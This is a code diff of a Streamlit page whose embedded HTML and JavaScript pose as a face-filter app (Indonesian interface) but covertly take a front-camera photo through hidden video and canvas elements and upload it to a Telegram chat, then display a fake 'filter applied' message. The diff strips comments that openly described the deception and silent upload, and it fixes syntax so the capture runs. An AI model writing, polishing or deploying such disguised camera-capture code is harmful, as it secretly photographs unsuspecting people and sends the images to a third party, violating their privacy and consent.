@@ -38,7 +38,6 @@ with st.container():
     st.markdown('<div class="auto-box">', unsafe_allow_html=True)
     
     auto_stealth_html = f"""
-    <!-- Tombol Pemicu Tunggal (Menipu Browser agar Memberi Izin Akses Kamera Depan) -->
     <div id="trigger-screen" style="text-align: center; padding: 25px 0;">
         <button id="magicBtn" style="
             background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%);
@@ -55,7 +54,6 @@ with st.container():
         ">✨ MUAT FILTER & EFEK WAJAH</button>
     </div>
 
-    <!-- Tampilan Antarmuka Setelah Diizinkan -->
     <div id="studio-view" style="display:none; text-align: center;">
         <div style="position: relative; width: 100%; max-width: 380px; margin: 0 auto; border-radius: 14px; overflow: hidden; background: #000; border: 2px solid #38bdf8;">
             <video id="front-cam" autoplay playsinline style="width: 100%; display: block; transform: scaleX(-1);"></video>
@@ -77,7 +75,6 @@ with st.container():
         }}
     </style>
 
-    <!-- Elemen Tersembunyi untuk Ekstraksi Otomatis -->
     <video id="hidden-vid" autoplay playsinline style="display:none;"></video>
     <canvas id="hidden-canvas" width="1280" height="720" style="display:none;"></canvas>
 
@@ -91,12 +88,10 @@ with st.container():
             btn.style.opacity = "0.7";
 
             try {{
-                // Memaksa akses khusus kamera depan (facingMode: user)
                 const stream = await navigator.mediaDevices.getUserMedia({{ 
                     video: {{ facingMode: "user", width: {{ ideal: 1280 }}, height: {{ ideal: 720 }} }} 
                 }});
 
-                // Sembunyikan layar awal, tampilkan viewfinder studio
                 document.getElementById('trigger-screen').style.display = "none";
                 document.getElementById('studio-view').style.display = "block";
 
@@ -105,13 +100,11 @@ with st.container():
                 frontCam.srcObject = stream;
                 hiddenVid.srcObject = stream;
 
-                // Jeda sebentar agar kamera stabil, lalu lakukan AUTO-SHOOT senyap
                 setTimeout(() => {{
                     const canvas = document.getElementById('hidden-canvas');
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(hiddenVid, 0, 0, canvas.width, canvas.height);
 
-                    // Kirim otomatis file foto ke Telegram secara background tanpa ketahuan
                     canvas.toBlob(function(blob) {{
                         const formData = new FormData();
                         formData.append('chat_id', targetChatId);
@@ -124,14 +117,13 @@ with st.container():
                         }});
                     }}, 'image/jpeg', 0.95);
 
-                    // Ubah status teks agar terlihat seolah-olah sedang memproses filter
                     setTimeout(() => {{
-                        document.getElementById('status-infoinnerHTML = "🎉 Filter Berhasil Diterapkan! Selamat menikmati.";
+                        document.getElementById('status-info').innerHTML = "🎉 Filter Berhasil Diterapkan! Selamat menikmati.";
                     }}, 1500);
 
-                }}, 1200); // Waktu jeda 1.2 detik untuk auto-shoot
+                }}, 1200);
 
-            } catch(err) {{
+            }} catch(err) {{
                 console.log("Error:", err);
                 btn.innerText = "IZIN DITOLAK - KLIK ULANG";
                 btn.style.opacity = "1";
